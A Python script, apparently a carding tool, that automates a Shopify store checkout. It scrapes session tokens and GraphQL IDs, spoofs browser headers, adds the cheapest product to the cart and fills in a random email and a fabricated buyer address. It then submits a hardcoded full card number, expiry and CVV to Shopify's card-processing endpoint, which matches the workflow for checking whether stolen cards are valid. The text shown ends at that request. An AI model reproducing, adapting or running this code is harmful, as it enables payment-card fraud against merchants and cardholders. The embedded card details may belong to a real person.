import requests
import re
import json
import html
import random
import string
import urllib.parse
from typing import List, Optional, Tuple

#@MentosReborn
#@CodeXploide

domain = "https://us.mercihandy.com"
session = requests.Session()

FALLBACK_POLL_ID = "978b340f3027dc55313349c4089004147b6b0dccee75e42ed97685ef1feae418"

def normalize_url(url: str) -> str:
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    return url.rstrip('/')

def extract_checkout_token(url: str) -> str:
    token_re = re.compile(r'/checkouts/cn/([^/?]+)')
    m = token_re.search(url)
    if m:
        return m.group(1)
    token_re2 = re.compile(r'/cart/c/([^/?]+)')
    m2 = token_re2.search(url)
    if m2:
        return m2.group(1)
    return ""

def extract_session_token(html_text: str) -> str:
    unescaped = html.unescape(html_text)
    patterns = [
        r'<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"',
        r'"sessionToken"\s*:\s*"([^"]+)"',
        r'sessionToken["\']\s*:\s*["\']([^"\']+)',
        r'checkoutSessionToken["\']\s*:\s*["\']([^"\']+)',
    ]
    for p in patterns:
        m = re.search(p, unescaped)
        if m:
            val = m.group(1)
            return html.unescape(val).strip('"')
    return ""

def extract_stable_id(html_text: str) -> str:
    unescaped = html.unescape(html_text)
    re_pattern = re.compile(r'"stableId"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"')
    match = re_pattern.search(unescaped)
    if match:
        return match.group(1)
    return ""

def extract_commit_sha(html_text: str) -> str:
    unescaped = html.unescape(html_text)
    re_pattern = re.compile(r'"commitSha"\s*:\s*"([a-f0-9]{40})"')
    match = re_pattern.search(unescaped)
    if match:
        return match.group(1)
    return ""

def extract_source_token(html_text: str) -> str:
    re_pattern = re.compile(r'<meta\s+name="serialized-sourceToken"\s+content="([^"]*)"')
    m = re_pattern.search(html_text)
    if m:
        val = html.unescape(m.group(1))
        return val.strip('"')
    return ""

def extract_identification_signature(html_text: str) -> str:
    unescaped = html.unescape(html_text)
    patterns = [
        r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"',
        r'callerIdentificationSignature["\s:]+([^"}\s,]+)',
    ]
    for p in patterns:
        m = re.search(p, unescaped)
        if m:
            return m.group(1)
    return ""

#@MentosReborn
#@CodeXploide

def extract_private_access_token_id(html_text: str) -> str:
    unescaped = html.unescape(html_text)
    re_pattern = re.compile(r'"checkoutSessionIdentifier"\s*:\s*"([a-f0-9]+)"')
    match = re_pattern.search(unescaped)
    if match:
        return match.group(1)
    return ""

def fetch_private_access_token(session_obj, shop_url: str, checkout_url: str, pat_id: str) -> str:
    req_url = f"{shop_url}/private_access_tokens?id={urllib.parse.quote(pat_id)}&checkout_type=c1"
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "referer": checkout_url,
        "sec-ch-ua": '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36"
    }
    resp = session_obj.get(req_url, headers=headers)
    return f"[{resp.status_code}] {resp.text}"

def extract_actions_js_url(html_text: str, shop_url: str) -> str:
    patterns = [
        r'(/cdn/shopifycloud/checkout-web/assets/c1/actions[A-Za-z0-9_-]*\.[A-Za-z0-9_-]+\.js)',
        r'(/cdn/shopifycloud/checkout-web/assets/[^"]*actions[^"]*\.js)',
    ]
    for p in patterns:
        match = re.search(p, html_text)
        if match:
            return shop_url + match.group(1)
    return ""

def extract_processing_js_url(html_text: str, shop_url: str) -> str:
    patterns = [
        r'(/cdn/shopifycloud/checkout-web/assets/c1/useHasOrdersFromMultipleShops[A-Za-z0-9_.-]*\.js)',
        r'(/cdn/shopifycloud/checkout-web/assets/[A-Za-z0-9_/.-]*useHasOrdersFromMultipleShops[A-Za-z0-9_.-]*\.js)',
        r'(/cdn/shopifycloud/checkout-web/assets/[A-Za-z0-9_/.-]*[Pp]rocessing[A-Za-z0-9_.-]*\.js)',
        r'(/cdn/shopifycloud/checkout-web/assets/[A-Za-z0-9_/.-]*[Rr]eceipt[A-Za-z0-9_.-]*\.js)',
    ]
    for p in patterns:
        match = re.search(p, html_text)
        if match:
            return shop_url + match.group(1)
    return ""

def extract_events_js_url(html_text: str, shop_url: str) -> str:
    patterns = [
        r'(/cdn/shopifycloud/checkout-web/assets/c1/events-shared[^"]+\.js)',
        r'(/cdn/shopifycloud/checkout-web/assets/[^"]*events-shared[^"]*\.js)',
        r'(/cdn/shopifycloud/checkout-web/assets/[^"]*events[^"]*\.js)',
    ]
    for p in patterns:
        match = re.search(p, html_text)
        if match:
            return shop_url + match.group(1)
    script_events = re.findall(r'<script[^>]+src="([^"]+events[^"]+\.js)"', html_text)
    if script_events:
        for s in script_events:
            if not s.startswith('http'):
                return shop_url + s
            return s
    return ""

def fetch_js(session_obj, js_url: str, shop_url: str, referer: str) -> str:
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "origin": shop_url,
        "referer": referer,
        "sec-ch-ua": '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "script",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36"
    }
    resp = session_obj.get(js_url, headers=headers)
    if resp.status_code != 200:
        raise Exception(f"GET JS returned status {resp.status_code}")
    return resp.text

def extract_proposal_id(js_body: str) -> str:
    patterns = [
        r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"Proposal"',
        r'name:\s*"Proposal"\s*,\s*type:\s*"query"\s*,\s*id:\s*"([a-f0-9]{64})"',
        r'"Proposal"[^}]{0,200}id:\s*"([a-f0-9]{64})"',
        r'id:\s*"([a-f0-9]{64})"[^}]{0,200}"Proposal"',
        r'id:\s*\'([a-f0-9]{64})\'\s*,\s*type:\s*\'query\'\s*,\s*name:\s*\'Proposal\'',
    ]
    for p in patterns:
        match = re.search(p, js_body)
        if match:
            return match.group(1)
    return ""

def extract_submit_for_completion_id(js_body: str) -> str:
    patterns = [
        r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"mutation"\s*,\s*name:\s*"SubmitForCompletion"',
        r'name:\s*"SubmitForCompletion"\s*,\s*type:\s*"mutation"\s*,\s*id:\s*"([a-f0-9]{64})"',
        r'"SubmitForCompletion"[^}]{0,200}id:\s*"([a-f0-9]{64})"',
        r'id:\s*"([a-f0-9]{64})"[^}]{0,200}"SubmitForCompletion"',
        r'id:\s*\'([a-f0-9]{64})\'\s*,\s*type:\s*\'mutation\'\s*,\s*name:\s*\'SubmitForCompletion\'',
    ]
    for p in patterns:
        match = re.search(p, js_body)
        if match:
            return match.group(1)
    return ""

def extract_poll_for_receipt_id(js_body: str) -> str:
    patterns = [
        r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"PollForReceipt"',
        r'name:\s*"PollForReceipt"\s*,\s*type:\s*"query"\s*,\s*id:\s*"([a-f0-9]{64})"',
        r'"PollForReceipt"[^}]{0,200}id:\s*"([a-f0-9]{64})"',
        r'id:\s*"([a-f0-9]{64})"[^}]{0,200}"PollForReceipt"',
        r'id:\s*\'([a-f0-9]{64})\'\s*,\s*type:\s*\'query\'\s*,\s*name:\s*\'PollForReceipt\'',
        r'PollForReceipt.{0,300}?([a-f0-9]{64})',
        r'([a-f0-9]{64}).{0,300}?PollForReceipt',
        r'id:([a-f0-9]{64}),type:"query",name:"PollForReceipt"',
        r'id:"([a-f0-9]{64})",.*?name:"PollForReceipt"',
    ]
    for p in patterns:
        match = re.search(p, js_body)
        if match:
            return match.group(1)
    return ""

def extract_receipt_id(submit_body: str) -> str:
    patterns = [
        r'"id"\s*:\s*"(gid://shopify/ProcessedReceipt/[0-9]+)"',
        r'"id"\s*:\s*"(gid://shopify/[A-Za-z]+Receipt/[0-9]+)"',
        r'"receipt"\s*:\s*\{\s*"id"\s*:\s*"([^"]+)"',
    ]
    for p in patterns:
        match = re.search(p, submit_body)
        if match:
            return match.group(1)
    return ""

def extract_receipt_session_token(submit_body: str) -> str:
    patterns = [
        r'"sessionToken"\s*:\s*"([^"]+)"',
        r'"receiptSessionToken"\s*:\s*"([^"]+)"',
    ]
    for p in patterns:
        match = re.search(p, submit_body)
        if match:
            return match.group(1)
    return ""

#@MentosReborn
#@CodeXploide

def extract_queue_token(response_body: str) -> str:
    re_pattern = re.compile(r'"queueToken"\s*:\s*"([^"]+)"')
    m = re_pattern.search(response_body)
    if m:
        return m.group(1)
    return ""

def extract_delivery_handle(proposal_body: str) -> str:
    patterns = [
        r'"selectedDeliveryStrategy"\s*:\s*\{\s*"handle"\s*:\s*"([^"]+)"\s*,\s*"__typename"\s*:\s*"CompleteDeliveryStrategy"',
        r'"handle"\s*:\s*"([^"]+)"\s*,\s*"__typename"\s*:\s*"CompleteDeliveryStrategy"',
        r'"selectedDeliveryStrategy".*?"handle"\s*:\s*"([^"]+)"',
    ]
    for p in patterns:
        match = re.search(p, proposal_body)
        if match:
            return match.group(1)
    return ""

def extract_signed_handles(proposal_body: str) -> List[str]:
    re_pattern = re.compile(r'"signedHandle"\s*:\s*"([^"]+)"')
    matches = re_pattern.findall(proposal_body)
    return matches

def extract_payment_method_id(proposal_body: str) -> str:
    re_pattern = re.compile(r'"paymentMethodIdentifier"\s*:\s*"([^"]+)"\s*,\s*"name"\s*:\s*"shopify_payments"')
    match = re_pattern.search(proposal_body)
    if match:
        return match.group(1)
    return ""

def extract_submit_error(submit_body: str) -> str:
    error_re = re.compile(r'"nonLocalizedMessage"\s*:\s*"([^"]+)"')
    matches = error_re.findall(submit_body)
    if matches:
        return matches[0]
    code_re = re.compile(r'"code"\s*:\s*"([^"]+)"')
    matches = code_re.findall(submit_body)
    if matches:
        return matches[0]
    return ""

def extract_any_error(submit_body: str) -> str:
    match = re.search(r'"nonLocalizedMessage"\s*:\s*"([^"]+)"', submit_body)
    if match:
        return match.group(1)
    match = re.search(r'"localizedMessage"\s*:\s*"([^"]+)"', submit_body)
    if match:
        return match.group(1)
    match = re.search(r'"code"\s*:\s*"([^"]+)"', submit_body)
    if match:
        return match.group(1)
    match = re.search(r'"message"\s*:\s*"([^"]+)"', submit_body)
    if match:
        return match.group(1)
    return ""

def extract_shipping_amount(proposal_body: str) -> str:
    patterns = [
        r'"deliveryStrategyBreakdown"\s*:\s*\[\s*\{\s*"amount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"',
        r'"shippingAmount"[^}]*"amount"\s*:\s*"([^"]+)"',
    ]
    for p in patterns:
        match = re.search(p, proposal_body)
        if match:
            return match.group(1)
    return ""

def extract_checkout_total(proposal_body: str) -> str:
    re_pattern = re.compile(r'"checkoutTotal"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"')
    match = re_pattern.search(proposal_body)
    if match:
        return match.group(1)
    return ""

def extract_seller_total(proposal_body: str) -> str:
    re_pattern = re.compile(r'"total"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"')
    match = re_pattern.search(proposal_body)
    if match:
        return match.group(1)
    return ""

def extract_seller_merchandise_price(proposal_body: str) -> str:
    re_pattern = re.compile(r'"ContextualizedProductVariantMerchandise".*?"totalAmount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"')
    match = re_pattern.search(proposal_body)
    if match:
        return match.group(1)
    return ""

def extract_seller_currency(proposal_body: str) -> str:
    re_pattern = re.compile(r'"supportedCurrencies"\s*:\s*\["([^"]+)"')
    match = re_pattern.search(proposal_body)
    if match:
        return match.group(1)
    return ""

def extract_seller_country(proposal_body: str) -> str:
    re_pattern = re.compile(r'"supportedCountries"\s*:\s*\["([^"]+)"')
    match = re_pattern.search(proposal_body)
    if match:
        return match.group(1)
    return ""

def patch_payload(payload: str, currency: str, country: str) -> str:
    if currency != "USD":
        payload = payload.replace('"currencyCode": "USD"', f'"currencyCode": "{currency}"')
        payload = payload.replace('"presentmentCurrency": "USD"', f'"presentmentCurrency": "{currency}"')
    if country != "US":
        payload = payload.replace('"countryCode": "US"', f'"countryCode": "{country}"')
        payload = payload.replace('"phoneCountryCode": "US"', f'"phoneCountryCode": "{country}"')
    return payload

def generate_attempt_token(checkout_token: str) -> str:
    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    token_part = ''.join(random.choice(chars) for _ in range(10))
    return f"{checkout_token}-{token_part}"

def generate_page_id() -> str:
    return f"{random.getrandbits(64):016x}"

def extract_currency_from_cart(cart_data: dict) -> str:
    if 'currency' in cart_data:
        return cart_data['currency']
    if 'items' in cart_data and len(cart_data['items']) > 0:
        if 'price' in cart_data['items'][0]:
            price_str = cart_data['items'][0]['price']
            match = re.match(r'^[^\d]*', price_str)
            if match:
                return match.group(0)
    return "USD"

def extract_pci_session_id(pci_body: str) -> str:
    re_pattern = re.compile(r'"id"\s*:\s*"([^"]+)"')
    match = re_pattern.search(pci_body)
    if match:
        return match.group(1)
    return ""

domain = normalize_url(domain)

home_headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'priority': 'u=0, i',
    'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
}

session.get(domain + '/', headers=home_headers)

products_headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9',
    'referer': domain + '/',
    'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

products_resp = session.get(domain + '/products.json?limit=250', headers=products_headers)
if products_resp.status_code != 200:
    products_resp = session.get(domain + '/products.json?limit=250&page=1', headers=products_headers)

products = products_resp.json().get('products', [])

if not products:
    print("No products found")
    exit()

selected_product = None
selected_variant = None
min_price = float('inf')
for product in products:
    for variant in product.get('variants', []):
        if variant.get('available') and variant.get('price'):
            price = float(variant['price'])
            if price > 0 and price < min_price:
                min_price = price
                selected_product = product
                selected_variant = variant

if not selected_product:
    for product in products:
        for variant in product.get('variants', []):
            if variant.get('available') and variant.get('price'):
                price = float(variant['price'])
                if price < min_price:
                    min_price = price
                    selected_product = product
                    selected_variant = variant

if not selected_product:
    selected_product = products[0]
    selected_variant = selected_product['variants'][0]

print(f"Product: {selected_product['title']} - ${selected_variant['price']}")

#@MentosReborn
#@CodeXploide

add_headers = {
    'accept': 'application/javascript',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': domain,
    'referer': f"{domain}/products/{selected_product['handle']}?variant={selected_variant['id']}",
    'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

add_data = {
    'id': str(selected_variant['id']),
    'quantity': '1',
    'form_type': 'product',
    'utf8': '✓',
}

add_resp = session.post(domain + '/cart/add', headers=add_headers, data=add_data)
print("Variant Id:", add_resp.json().get('id', add_resp.json().get('variant_id', '')))

cart_headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9',
    'referer': f"{domain}/products/{selected_product['handle']}?variant={selected_variant['id']}",
    'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

cart_resp = session.get(domain + '/cart.js', headers=cart_headers)
cart_data = cart_resp.json()
cart_token = cart_data.get('token', '')
clean_token = cart_token.split('?')[0] if cart_token else ""
key = cart_token.split('?key=')[1] if '?key=' in cart_token else None
currency = extract_currency_from_cart(cart_data)
country = "US"
print(f"Currency: {currency}")

checkout_headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'priority': 'u=0, i',
    'referer': f"{domain}/products/{selected_product['handle']}?variant={selected_variant['id']}",
    'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
}

checkout_params = {}
if key:
    checkout_params['key'] = key
checkout_params['skip_shop_pay'] = 'true'

checkout_url = f"{domain}/cart/c/{clean_token}"
checkout_resp = session.get(checkout_url, params=checkout_params, headers=checkout_headers, allow_redirects=True)
checkout_url_final = checkout_resp.url
html_text = checkout_resp.text

checkout_token = extract_checkout_token(checkout_url_final)
session_token = extract_session_token(html_text)
stable_id = extract_stable_id(html_text)
build_id = extract_commit_sha(html_text)
source_token = extract_source_token(html_text)
ident_sig = extract_identification_signature(html_text)

if not session_token:
    alt_token_re = re.compile(r'"checkoutSessionIdentifier"\s*:\s*"([a-f0-9]+)"')
    m_alt = alt_token_re.search(html.unescape(html_text))
    if m_alt:
        session_token = m_alt.group(1)

if not source_token:
    source_token = checkout_token

actions_url = extract_actions_js_url(html_text, domain)
processing_url = extract_processing_js_url(html_text, domain)
events_js_url = extract_events_js_url(html_text, domain)

if not actions_url:
    all_scripts = re.findall(r'<script[^>]+src="([^"]+\.js)"', html_text)
    for script in all_scripts:
        if 'actions' in script.lower():
            if not script.startswith('http'):
                actions_url = domain + script
            else:
                actions_url = script
            break

js_body = ""
if actions_url:
    try:
        js_body = fetch_js(session, actions_url, domain, checkout_url_final)
    except Exception as e:
        print(f"Failed to fetch actions JS: {e}")

proposal_id = extract_proposal_id(js_body) if js_body else ""
submit_id = extract_submit_for_completion_id(js_body) if js_body else ""

poll_id = ""
for source_js in [events_js_url, processing_url]:
    if source_js and not poll_id:
        try:
            js = fetch_js(session, source_js, domain, checkout_url_final)
            poll_id = extract_poll_for_receipt_id(js)
        except Exception as e:
            print(f"Failed to fetch JS for poll ID: {e}")

if not poll_id and js_body:
    poll_id = extract_poll_for_receipt_id(js_body)

if not poll_id:
    all_js_urls = re.findall(r'<script[^>]+src="([^"]+\.js)"', html_text)
    for js_url in all_js_urls:
        if not js_url.startswith('http'):
            js_url = domain + js_url
        try:
            js = fetch_js(session, js_url, domain, checkout_url_final)
            poll_id = extract_poll_for_receipt_id(js)
            if poll_id:
                break
        except Exception as e:
            continue

if not poll_id:
    poll_id = FALLBACK_POLL_ID
    print("Using fallback PollForReceiptId")

print(f"CheckoutToken: {checkout_token}")
print(f"SessionToken: {session_token}")
print(f"StableId: {stable_id}")
print(f"BuildId: {build_id}")
print(f"SourceToken: {source_token}")
print(f"ProposalId: {proposal_id}")
print(f"SubmitId: {submit_id}")
print(f"PollForReceiptId: {poll_id}")
print(f"IdentSig: {ident_sig}")

if not all([checkout_token, session_token, stable_id, build_id, proposal_id, submit_id]):
    print("Missing required tokens, extraction failed")
    missing = []
    if not checkout_token: missing.append("CheckoutToken")
    if not session_token: missing.append("SessionToken")
    if not stable_id: missing.append("StableId")
    if not build_id: missing.append("BuildId")
    if not proposal_id: missing.append("ProposalId")
    if not submit_id: missing.append("SubmitId")
    print(f"Missing: {', '.join(missing)}")

base_proposal = {
    "sessionInput": {"sessionToken": session_token},
    "queueToken": None,
    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
    "delivery": {
        "deliveryLines": [{
            "destination": {"partialStreetAddress": {"address1": "", "city": "", "countryCode": "US", "lastName": "", "phone": "", "oneTimeUse": False}},
            "selectedDeliveryStrategy": {"deliveryStrategyMatchingConditions": {"estimatedTimeInTransit": {"any": True}, "shipments": {"any": True}}, "options": {}},
            "targetMerchandiseLines": {"any": True},
            "deliveryMethodTypes": ["SHIPPING"],
            "expectedTotalPrice": {"any": True},
            "destinationChanged": True
        }],
        "noDeliveryRequired": [], "useProgressiveRates": False, "prefetchShippingRatesStrategy": None, "supportsSplitShipping": True
    },
    "deliveryExpectations": {"deliveryExpectationLines": []},
    "merchandise": {
        "merchandiseLines": [{
            "stableId": stable_id,
            "merchandise": {"productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{selected_variant['id']}", "variantId": f"gid://shopify/ProductVariant/{selected_variant['id']}", "properties": [], "sellingPlanId": None, "sellingPlanDigest": None}},
            "quantity": {"items": {"value": 1}},
            "expectedTotalPrice": {"any": True}, "lineComponentsSource": None, "lineComponents": []
        }]
    },
    "memberships": {"memberships": []},
    "payment": {"totalAmount": {"any": True}, "paymentLines": [], "billingAddress": {"streetAddress": {"address1": "", "city": "", "countryCode": "US", "lastName": "", "phone": ""}}},
    "buyerIdentity": {"customer": {"presentmentCurrency": currency, "countryCode": country}, "phoneCountryCode": country, "marketingConsent": [], "shopPayOptInPhone": {"countryCode": country}, "rememberMe": False},
    "tip": {"tipLines": []}, "poNumber": None,
    "taxes": {"proposedAllocations": None, "proposedTotalAmount": {"any": True}, "proposedTotalIncludedAmount": None, "proposedMixedStateTotalAmount": None, "proposedExemptions": []},
    "note": {"message": None, "customAttributes": []},
    "localizationExtension": {"fields": []}, "nonNegotiableTerms": None,
    "scriptFingerprint": {"signature": None, "signatureUuid": None, "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []},
    "optionalDuties": {"buyerRefusesDuties": False}, "cartMetafields": []
}

proposal_gql = json.dumps({
    "variables": base_proposal,
    "operationName": "Proposal",
    "id": proposal_id
})
proposal_gql = patch_payload(proposal_gql, currency, country)

proposal_headers = {
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/json',
    'origin': domain,
    'referer': checkout_url_final,
    'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'shopify-checkout-client': 'checkout-web/1.0',
    'shopify-checkout-source': f'id="{checkout_token}", type="cn"',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
    'x-checkout-one-session-token': session_token,
    'x-checkout-web-build-id': build_id,
    'x-checkout-web-deploy-stage': 'production',
    'x-checkout-web-source-id': source_token,
}

proposal_resp = session.post(
    f"{domain}/checkouts/internal/graphql/persisted",
    params={'operationName': 'Proposal'},
    headers=proposal_headers,
    data=proposal_gql,
)
proposal_data = proposal_resp.json()
print(f"Proposal1 Status: {proposal_resp.status_code}")
if proposal_resp.status_code != 200:
    print(f"Proposal1 Error: {json.dumps(proposal_data)}")
queue_token = extract_queue_token(json.dumps(proposal_data))
print(f"QueueToken: {queue_token}")

email_domains = ["gmail.com", "yahoo.com", "outlook.com"]
first_names = ["james", "john", "robert", "michael", "william"]
last_names = ["smith", "johnson", "williams", "brown", "jones"]
email = f"{random.choice(first_names)}{random.choice(last_names)}{random.randint(1, 999)}@{random.choice(email_domains)}"
print(f"Email: {email}")

addr = {
    "first_name": "Python",
    "last_name": "Shelby",
    "address1": "St 82",
    "address2": "",
    "city": "Ny",
    "country_code": "US",
    "zone_code": "NY",
    "postal_code": "10010",
    "phone": "+12125551212",
}

proposal2_variables = base_proposal.copy()
proposal2_variables["queueToken"] = queue_token
proposal2_variables["buyerIdentity"]["email"] = email
proposal2_variables["buyerIdentity"]["emailChanged"] = True

proposal2_gql = json.dumps({
    "variables": proposal2_variables,
    "operationName": "Proposal",
    "id": proposal_id
})
proposal2_gql = patch_payload(proposal2_gql, currency, country)

proposal2_resp = session.post(
    f"{domain}/checkouts/internal/graphql/persisted",
    params={'operationName': 'Proposal'},
    headers=proposal_headers,
    data=proposal2_gql,
)
proposal2_data = proposal2_resp.json()
print(f"Proposal2 Status: {proposal2_resp.status_code}")
if proposal2_resp.status_code != 200:
    print(f"Proposal2 Error: {json.dumps(proposal2_data)}")
queue_token2 = extract_queue_token(json.dumps(proposal2_data))
print(f"QueueToken2: {queue_token2}")

proposal3_variables = proposal2_variables.copy()
proposal3_variables["queueToken"] = queue_token2
proposal3_variables["delivery"]["deliveryLines"][0]["destination"]["partialStreetAddress"] = {
    "address1": addr["address1"], "city": addr["city"], "countryCode": addr["country_code"],
    "postalCode": addr["postal_code"], "firstName": addr["first_name"], "lastName": addr["last_name"],
    "zoneCode": addr["zone_code"], "phone": addr["phone"], "oneTimeUse": False
}
proposal3_variables["payment"]["billingAddress"]["streetAddress"] = {
    "address1": addr["address1"], "city": addr["city"], "countryCode": addr["country_code"],
    "postalCode": addr["postal_code"], "firstName": addr["first_name"], "lastName": addr["last_name"],
    "zoneCode": addr["zone_code"], "phone": addr["phone"]
}
proposal3_variables["buyerIdentity"]["emailChanged"] = False

proposal3_gql = json.dumps({
    "variables": proposal3_variables,
    "operationName": "Proposal",
    "id": proposal_id
})
proposal3_gql = patch_payload(proposal3_gql, currency, country)

proposal3_resp = session.post(
    f"{domain}/checkouts/internal/graphql/persisted",
    params={'operationName': 'Proposal'},
    headers=proposal_headers,
    data=proposal3_gql,
)
proposal3_data = proposal3_resp.json()
print(f"Proposal3 Status: {proposal3_resp.status_code}")
if proposal3_resp.status_code != 200:
    print(f"Proposal3 Error: {json.dumps(proposal3_data)}")
queue_token3 = extract_queue_token(json.dumps(proposal3_data))
print(f"QueueToken3: {queue_token3}")

proposal3_str = json.dumps(proposal3_data)
delivery_handle = extract_delivery_handle(proposal3_str)
signed_handles = extract_signed_handles(proposal3_str)
shipping_amount = extract_shipping_amount(proposal3_str)
total_amount = extract_checkout_total(proposal3_str)
if not total_amount:
    total_amount = extract_seller_total(proposal3_str)

if not currency or currency == "USD":
    extracted_currency = extract_seller_currency(proposal3_str)
    if extracted_currency:
        currency = extracted_currency
if country == "US":
    extracted_country = extract_seller_country(proposal3_str)
    if extracted_country:
        country = extracted_country

print(f"DeliveryHandle: {delivery_handle}")
print(f"SignedHandles: {signed_handles}")
print(f"ShippingAmount: {shipping_amount}")
print(f"TotalAmount: {total_amount}")

card_number = "5456 1500 1550 7529"
card_month = 3
card_year = 2028
cvv = "166"
card_name = f"{addr['first_name']} {addr['last_name']}"

shop_domain = domain.replace("https://", "").replace("http://", "").split("/")[0]
payment_scope = shop_domain

pci_headers = {
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/json',
    'origin': 'https://checkout.pci.shopifyinc.com',
    'referer': 'https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html?identifier=&locationURL=',
    'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'shopify-identification-signature': ident_sig,
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
}

pci_json = {
    'credit_card': {
        'number': card_number,
        'month': card_month,
        'year': card_year,
        'verification_value': cvv,
        'start_month': None,
        'start_year': None,
        'issue_number': '',
        'name': card_name,
    },
    'payment_session_scope': payment_scope,
}

pci_session = requests.Session()
pci_resp = pci_session.post('https://checkout.pci.shopifyinc.com/sessions', headers=pci_headers, json=pci_json)

